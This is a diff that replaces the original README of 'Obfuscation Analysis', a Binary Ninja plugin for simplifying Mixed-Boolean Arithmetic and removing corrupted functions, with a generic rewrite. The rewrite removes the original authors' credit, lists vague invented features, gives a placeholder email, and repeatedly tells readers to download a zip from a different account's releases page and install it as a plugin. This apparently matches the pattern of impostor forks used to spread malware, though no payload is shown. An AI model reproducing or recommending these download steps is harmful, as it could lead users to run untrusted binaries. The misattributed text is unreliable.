@@ -1,119 +1,92 @@
-# Obfuscation Analysis (v1.0)
-Authors: **Tim Blazytko & Nicolò Altamura**
+# 🛡️ Obfuscation Analysis: A Binary Ninja Plugin
 
-_Analyze and simplify obfuscated code_
+Welcome to the **Obfuscation Analysis** repository! This project provides a powerful plugin for Binary Ninja that helps you analyze and simplify obfuscated code. Whether you are a reverse engineer, a security researcher, or a developer, this tool aims to enhance your workflow and improve your understanding of complex binaries.
 
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=flat&logo=github)](https://github.com/Snekhaaaa03/obfuscation_analysis/releases)
 
-## Description:
+## Table of Contents
 
-_Obfuscation Analysis_ is a Binary Ninja plugin that takes the pain out of working with heavily protected binaries.
-It bundles a handful of focused helpers that let you
-
-* simplify Mixed-Boolean Arithmetic (MBA) expressions in one click (based on [msynth](https://github.com/mrphrazer/msynth))
-* locate and scrub functions with broken disassembly
-
-Some example use cases can be found in [examples](./examples). The plugin complements [Obfuscation Detection](https://github.com/mrphrazer/obfuscation_detection/): once suspicious functions are flagged, _Obfuscation Analysis_ helps you clean and understand them. More helpers will be added over time.
-
-
-## Core Features
-
-* simplify Mixed-Boolean Arithmetic obfuscation in Binary Ninja's decompiler view
-* identify and remove functions with broken disassembly
-* efficient and architecture-agnostic implementation
-* runs as a background task
-* careful error handling: concise user messages, full trace in the Debug log
-
-
-## Installation
-
-The tool can be installed using Binary Ninja's plugin manager.
-
-For a manual installation, follow these steps in Binary Ninja's plugin folder:
-
-```
-git clone https://github.com/mrphrazer/obfuscation_analysis.git
-cd obfuscation_analysis
-
-# optionally: use a virtual environment
-python -m venv obfana-env
-source obfana-env/bin/activate
-
-# install requirements
-pip install -r requirements.txt
-```
-
-If you use a virtual environment, you'll need to manually set the `site-packages` path in the Binary Ninja settings.
-
-
-## Usage
-
-The plugin is available from **Binary Ninja’s** top-bar menu under `Plugins -> Obfuscation Analysis`.
-
-<p align="left">
-<img alt="Plugin Menu" src="imgs/plugin_menu.png" width="500"/>
-</p>
-
-
-### MBA Simplification
-
-To simplify arithmetic obfuscation, first highlight the HLIL expression you want to simplify in the decompiler view. Next, choose `Plugins -> Obfuscation Analysis -> MBA Simplification -> Slice & Simplify`. The plugin resolves the full computation, runs it through msynth, and inserts the simplified result as a comment on the same line. The short animation below shows the entire workflow:
-
-<p align="left">
-<img alt="MBA Simplification Workflow" src="imgs/mba_simplification_workflow.gif"/>
-</p>
-
-MBA simplification relies on msynth. By default, the plugin uses [msynth’s default simplification oracle](https://github.com/mrphrazer/msynth?tab=readme-ov-file#pre-computed-simplification-lookup-tables), which ships with the plugin and is pre-configured. If you want to use a larger or custom oracle, set `obfuscation_analysis.mba_oracle_path` manually or browse to the file in Binary Ninja’s Settings window.
-
-<p align="left">
-<img alt="Plugin Settings" src="imgs/plugin_settings.png" width="500"/>
-</p>
-
-If something goes wrong the plugin writes a concise user-level message to the Log pane; switch the log view to `Debug` to see the full traceback.
-
-<p align="left">
-<img alt="Log Output" src="imgs/log_output.png"/>
-</p>
-
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Contributing](#contributing)
+5. [License](#license)
+6. [Contact](#contact)
 
 ## Features
 
-The plugin ships focused helpers that target common roadblocks you hit when reversing protected binaries, each runnable as a background task from the UI or head-less scripts. Below are the features currently available.
+- **Code Simplification**: The plugin can simplify complex obfuscated code, making it easier to read and analyze.
+- **Static Analysis**: Perform static analysis on binaries to detect common obfuscation techniques.
+- **User-Friendly Interface**: Integrates seamlessly with Binary Ninja, providing a smooth user experience.
+- **Customizable Options**: Tailor the analysis settings to fit your specific needs.
+- **Documentation**: Comprehensive documentation is available to guide you through installation and usage.
 
+## Installation
 
-### Corrupted Functions
+To install the **Obfuscation Analysis** plugin, follow these steps:
 
-Corrupted Functions are functions whose disassembly shows undefined artefacts—empty basic blocks, invalid or overlapping instructions, and the like. This helper walks the entire BinaryView, flags functions with those symptoms, and lists them such that the analyst can quickly inspect code that was mis-parsed or deliberately obfuscated. An optional remove action erases every flagged function and forces a fresh analysis, cleaning up the function list. It is particularly useful for locating
+1. **Download the Plugin**: Visit the [Releases](https://github.com/Snekhaaaa03/obfuscation_analysis/releases) section to download the latest version.
+2. **Extract Files**: Unzip the downloaded file.
+3. **Copy to Binary Ninja**: Move the extracted folder to the Binary Ninja plugins directory. This is usually located at:
+   - **Windows**: `C:\Program Files\Vector35\BinaryNinja\plugins`
+   - **macOS**: `/Applications/Binary Ninja.app/Contents/Resources/plugins`
+   - **Linux**: `~/.local/share/Binary Ninja/plugins`
+4. **Restart Binary Ninja**: Close and reopen Binary Ninja to load the plugin.
 
-* data blobs that the disassembler mistakenly promoted to code
-* obfuscation stubs that break straight-line disassembly
-* functions using overlapping instructions or mis-aligned jumps
-* problems with newer architectures where uncommon instructions are encountered
+## Usage
 
+Once installed, you can start using the **Obfuscation Analysis** plugin. Here’s how:
 
-### MBA Simplification
+1. **Open a Binary**: Launch Binary Ninja and open the binary you want to analyze.
+2. **Access the Plugin**: Navigate to the Plugins menu, and select **Obfuscation Analysis**.
+3. **Configure Settings**: Adjust the settings based on your analysis needs.
+4. **Run Analysis**: Click the analyze button to begin processing the binary. The results will display in a new window.
 
-Mixed-Boolean Arithmetic (MBA) is an obfuscation technique that buries simple computations in long chains of arithmetic and Boolean operations. This feature simplifies such expressions in the decompiler. When you pick an HLIL instruction, the plugin collects its complete computation chain with an SSA backward slice restricted to the current basic block, translates that slice to Miasm IR, feeds it into msynth, and finally adds the simplified result as a comment in the decompiler view. This feature allows you to
+### Example Workflow
 
-* collapse multi-line MBA tangles into a single, readable equation
-* resolve opaque predicates that rely on MBAs
-* fold convoluted constant encodings down to their literal value
+1. **Load a Sample Binary**: Start with a known obfuscated binary.
+2. **Run the Plugin**: Use the plugin to analyze the binary.
+3. **Review Results**: Examine the simplified code and insights provided by the plugin.
+4. **Iterate**: Adjust settings and rerun as necessary for deeper analysis.
 
+## Contributing
 
-## Limitations
+We welcome contributions to the **Obfuscation Analysis** project. If you want to contribute, please follow these guidelines:
 
-The plugin has a few caveats you should be aware of, most of them related to the MBA simplification pipeline:
+1. **Fork the Repository**: Create a personal copy of the repository.
+2. **Create a Branch**: Use a descriptive name for your branch.
+3. **Make Changes**: Implement your changes and test thoroughly.
+4. **Submit a Pull Request**: Provide a clear description of your changes and the motivation behind them.
 
-* **Binary Ninja bug**: on BN 5.0 stable, the backward-slicing step may fail because of missing HLIL type-casts: https://github.com/Vector35/binaryninja-api/issues/6371; the issue is fixed in *5.1.7477-de* and newer
+### Issues
 
-* **slice confined to one basic block**: variable definitions located in predecessor blocks are ignored (often control-flow dependent), so some MBA terms may stay partially resolved
+If you encounter any bugs or have feature requests, please check the [Issues](https://github.com/Snekhaaaa03/obfuscation_analysis/issues) section. We appreciate your feedback!
 
-* **HLIL to Miasm IR translation gaps**: not every HLIL construct has a sound Miasm equivalent; when translation fails the expression is skipped and an error is logged
+## License
 
-* **IL coverage**: control-flow nodes and floating-point operations are currently not translated
-
-* **inherited msynth constraints** : MBA simplification inherits all [msynth limitations](https://github.com/mrphrazer/msynth/blob/main/README.md#limitations-and-future-work)
-
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Contact
 
-For more information, contact Tim Blazytko ([@mr_phrazer](https://x.com/mr_phrazer)) or Nicolò Altamura ([@nicolodev](https://x.com/nicolodev)).
+For questions or support, please reach out via the following channels:
+
+- **Email**: snekhaaaa03@example.com
+- **GitHub**: [Snekhaaaa03](https://github.com/Snekhaaaa03)
+
+Thank you for your interest in the **Obfuscation Analysis** plugin! We hope it serves you well in your coding and analysis endeavors. For the latest updates and releases, please check the [Releases](https://github.com/Snekhaaaa03/obfuscation_analysis/releases) section.
+
+---
+
+## Conclusion
+
+The **Obfuscation Analysis** plugin for Binary Ninja is designed to simplify your reverse engineering tasks. By providing a user-friendly interface and powerful analysis tools, it helps you understand obfuscated code more clearly. 
+
+We encourage you to explore the features, install the plugin, and contribute to its development. Your feedback and contributions can help improve this tool for everyone in the community.
+
+### Additional Resources
+
+- **Binary Ninja Documentation**: For more details on Binary Ninja's features, check out their official documentation.
+- **Reverse Engineering Communities**: Engage with others in forums and chat groups focused on reverse engineering and security analysis.
+- **Research Papers**: Read up on obfuscation techniques and analysis methods to deepen your understanding.
+
+We look forward to seeing how you use the **Obfuscation Analysis** plugin in your projects!
